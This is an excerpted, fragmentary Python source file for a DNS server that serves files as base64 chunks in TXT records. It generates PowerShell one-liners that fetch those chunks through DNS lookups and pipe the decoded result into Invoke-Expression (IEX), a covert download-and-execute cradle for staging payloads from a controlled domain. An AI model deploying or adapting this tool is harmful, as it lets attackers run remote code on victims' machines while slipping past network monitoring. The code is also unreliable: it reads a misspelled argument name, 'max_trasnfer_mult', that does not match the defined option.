...
from dnslib import RCODE, QTYPE, RR, TXT
...
class ShareDNS(BaseResolver):
        ...
        if request.q.qname.matchSuffix(self.domain):
            ...
            if request.q.qtype == QTYPE.TXT:
                ...
                if qname.matchSuffix("ls"):
                    ...
                    content = self.ls()
                    reply.add_answer(
                        RR(request.q.qname, QTYPE.TXT, ttl=60, rdata=TXT(content))
                    )
                            ...
                            if chunk_idx < len(chunks):
                                ...
                                reply.add_answer(
                                    RR(
                                        ...
                                        rdata=TXT(
                                            [
                                                chunk[i : i + MAX_TXT_SIZE]
                                                for i in range(
                                                    0, len(chunk), MAX_TXT_SIZE
                                                )
                                            ]
                                        ),
                                    )
                        ...
                        if fname in content:
                            ...
                            reply.add_answer(
                                RR(
                                    ...
                                    QTYPE.TXT,
                                    ttl=60,
                                    rdata=TXT([hash, cmd, str(n_chunks)]),
                                )
                            )
                        else:
                            reply.header.rcode = getattr(RCODE, "NXDOMAIN")
    ...
    def get_file_chunks(self, fname):
        ...
        f = b64encode(f)
        return [
            f[i : i + MAX_TRANSFER_SIZE] for i in range(0, len(f), MAX_TRANSFER_SIZE)
        ]
    ...
    def gen_download_cmd(self, fname, n_chunks):
        return (
            '$o="";0..'
            + str(n_chunks - 1)
            + '|%{$p=$_;0..99|%{try{$r=(Resolve-DnsName "$p.'
            + fname
            + ".f."
            + self.domain
            + '" -Type TXT -ErrorAction Stop).Strings;return}catch{sleep 1}};$r.ForEach({$o+=$_})};$res=[Convert]::FromBase64String($o)'
        )

    def gen_download_invoke_cmd(self, fname, n_chunks):
        return (
            self.gen_download_cmd(fname, n_chunks)
            + ";[Text.Encoding]::Utf8.GetString($o)|IEX"
        )
...
if __name__ == "__main__":
    ...
    p.add_argument(
        "--max-transfer-mult",
        default=1,
        help="Maximum transfer size multiplier 250 * <mult>",
    )
    args = p.parse_args()

    MAX_TRANSFER_SIZE = MAX_TRANSFER_SIZE * args.max_trasnfer_mult

    print(
        "[I] Starting DNS share (%s) (%s:%d) [%s]"
        % (
            args.domain,
            args.address or "*",
            args.port,
    ...
    udp_server = DNSServer(
        resolver, port=args.port, address=args.address, handler=handler
    )
